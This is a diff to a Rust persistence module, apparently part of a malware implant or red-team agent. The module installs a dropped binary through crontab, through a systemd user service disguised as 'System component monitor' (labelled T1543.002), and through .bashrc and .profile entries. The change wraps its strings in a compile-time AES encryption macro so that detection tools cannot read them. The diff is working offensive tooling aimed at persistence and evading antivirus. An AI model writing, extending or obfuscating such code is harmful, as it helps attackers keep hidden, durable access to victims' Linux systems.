@@ -23,19 +23,21 @@ use std::fs;
 use std::io::Write;
 use std::path::PathBuf;
 use std::process::Command;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 
 // ── Helpers ───────────────────────────────────────────────────────────
 
 fn home_dir() -> Result<PathBuf, String> {
-    std::env::var("HOME")
+    std::env::var(aes_str!("HOME"))
         .map(PathBuf::from)
-        .map_err(|_| "HOME environment variable not set".to_string())
+        .map_err(|_| aes_str!("HOME environment variable not set"))
 }
 
 fn current_username() -> String {
-    std::env::var("USER")
-        .or_else(|_| std::env::var("LOGNAME"))
-        .unwrap_or_else(|_| "unknown".to_string())
+    std::env::var(aes_str!("USER"))
+        .or_else(|_| std::env::var(aes_str!("LOGNAME")))
+        .unwrap_or_else(|_| aes_str!("unknown"))
 }
 
 // ── Stable drop location ──────────────────────────────────────────────
@@ -45,7 +47,7 @@ fn current_username() -> String {
 // source is already at the destination.
 
 fn stable_drop(source: &str, name: &str) -> Result<String, String> {
-    let bin_dir = home_dir()?.join(".local").join("bin");
+    let bin_dir = home_dir()?.join(aes_str!(".local")).join(aes_str!("bin"));
     std::fs::create_dir_all(&bin_dir)
         .map_err(|e| format!("mkdir ~/.local/bin: {e}"))?;
 
@@ -76,11 +78,11 @@ pub fn install_cron(binary_path: &str) -> Result<String, String> {
     let name = std::path::Path::new(binary_path)
         .file_name()
         .map(|n| n.to_string_lossy().into_owned())
-        .unwrap_or_else(|| "agent".to_string());
+        .unwrap_or_else(|| aes_str!("agent"));
     let stable = stable_drop(binary_path, &name)?;
 
     // Read current crontab (suppress error if none exists)
-    let current = Command::new("crontab")
+    let current = Command::new(aes_str!("crontab"))
         .arg("-l")
         .output()
         .map_err(|e| format!("crontab -l failed: {e}"))?;
@@ -104,7 +106,7 @@ pub fn install_cron(binary_path: &str) -> Result<String, String> {
     fs::write(&tmp_path, &new_content)
         .map_err(|e| format!("Write temp crontab failed: {e}"))?;
 
-    let rc = Command::new("crontab")
+    let rc = Command::new(aes_str!("crontab"))
         .arg(&tmp_path)
         .status()
         .map_err(|e| format!("crontab <tmpfile> failed: {e}"))?;
@@ -116,7 +118,7 @@ pub fn install_cron(binary_path: &str) -> Result<String, String> {
     }
 
     // Verify
-    let verify = Command::new("crontab")
+    let verify = Command::new(aes_str!("crontab"))
         .arg("-l")
         .output()
         .map(|o| String::from_utf8_lossy(&o.stdout).contains(&stable))
@@ -130,12 +132,12 @@ pub fn install_cron(binary_path: &str) -> Result<String, String> {
             current_username()
         ))
     } else {
-        Err("Cron install appeared to succeed but entry not found in verification".to_string())
+        Err(aes_str!("Cron install appeared to succeed but entry not found in verification"))
     }
 }
 
 pub fn remove_cron(binary_path: &str) -> Result<String, String> {
-    let current = Command::new("crontab")
+    let current = Command::new(aes_str!("crontab"))
         .arg("-l")
         .output()
         .map_err(|e| format!("crontab -l: {e}"))?;
@@ -155,7 +157,7 @@ pub fn remove_cron(binary_path: &str) -> Result<String, String> {
     fs::write(&tmp_path, &filtered)
         .map_err(|e| format!("Write temp crontab: {e}"))?;
 
-    let rc = Command::new("crontab")
+    let rc = Command::new(aes_str!("crontab"))
         .arg(&tmp_path)
         .status()
         .map_err(|e| format!("crontab <tmpfile>: {e}"))?;
@@ -172,12 +174,12 @@ pub fn remove_cron(binary_path: &str) -> Result<String, String> {
 // ── T1543.002 - Systemd User Service ─────────────────────────────────
 
 fn systemd_unit_dir() -> Result<PathBuf, String> {
-    Ok(home_dir()?.join(".config").join("systemd").join("user"))
+    Ok(home_dir()?.join(aes_str!(".config")).join(aes_str!("systemd")).join(aes_str!("user")))
 }
 
 fn unit_file(name: &str) -> Result<PathBuf, String> {
     // Ensure the name ends with .service
-    let fname = if name.ends_with(".service") {
+    let fname = if name.ends_with(&aes_str!(".service")) {
         name.to_string()
     } else {
         format!("{name}.service")
@@ -205,13 +207,13 @@ pub fn install_systemd(unit_name: &str, binary_path: &str) -> Result<String, Str
         .map_err(|e| format!("mkdir -p {}: {e}", dir.display()))?;
 
     let unit_path = unit_file(unit_name)?;
-    let contents  = build_unit(&stable, "System component monitor");
+    let contents  = build_unit(&stable, &aes_str!("System component monitor"));
 
     fs::write(&unit_path, &contents)
         .map_err(|e| format!("Write unit file: {e}"))?;
 
     // Create symlink in wants/ so it's enabled without systemctl.
-    let wants_dir = dir.join("default.target.wants");
+    let wants_dir = dir.join(aes_str!("default.target.wants"));
     fs::create_dir_all(&wants_dir)
         .map_err(|e| format!("mkdir wants/: {e}"))?;
 
@@ -232,7 +234,7 @@ pub fn install_systemd(unit_name: &str, binary_path: &str) -> Result<String, Str
 
 pub fn remove_systemd(unit_name: &str) -> Result<String, String> {
     let unit_path  = unit_file(unit_name)?;
-    let wants_dir  = systemd_unit_dir()?.join("default.target.wants");
+    let wants_dir  = systemd_unit_dir()?.join(aes_str!("default.target.wants"));
     let wants_link = wants_dir.join(unit_path.file_name().unwrap());
 
     let mut removed = Vec::new();
@@ -279,11 +281,11 @@ pub fn install_profile(binary_path: &str) -> Result<String, String> {
     let name = std::path::Path::new(binary_path)
         .file_name()
         .map(|n| n.to_string_lossy().into_owned())
-        .unwrap_or_else(|| "agent".to_string());
+        .unwrap_or_else(|| aes_str!("agent"));
     let stable = stable_drop(binary_path, &name)?;
 
     let home = home_dir()?;
-    let targets = [home.join(".bashrc"), home.join(".profile")];
+    let targets = [home.join(aes_str!(".bashrc")), home.join(aes_str!(".profile"))];
     let entry   = profile_entry(&stable);
     let mut installed = Vec::new();
     let mut errors    = Vec::new();
@@ -325,8 +327,8 @@ pub fn install_profile(binary_path: &str) -> Result<String, String> {
 pub fn remove_profile(binary_path: &str) -> Result<String, String> {
     let home = home_dir()?;
     let targets = [
-        home.join(".bashrc"),
-        home.join(".profile"),
+        home.join(aes_str!(".bashrc")),
+        home.join(aes_str!(".profile")),
     ];
 
     let mut cleaned = Vec::new();
@@ -843,7 +845,7 @@ pub fn list() -> String {
 
     // Crontab
     out.push("=== Crontab ===".to_string());
-    match Command::new("crontab").arg("-l").output() {
+    match Command::new(aes_str!("crontab")).arg("-l").output() {
         Ok(o) if o.status.success() => {
             let text = String::from_utf8_lossy(&o.stdout);
             let entries: Vec<_> = text.lines()
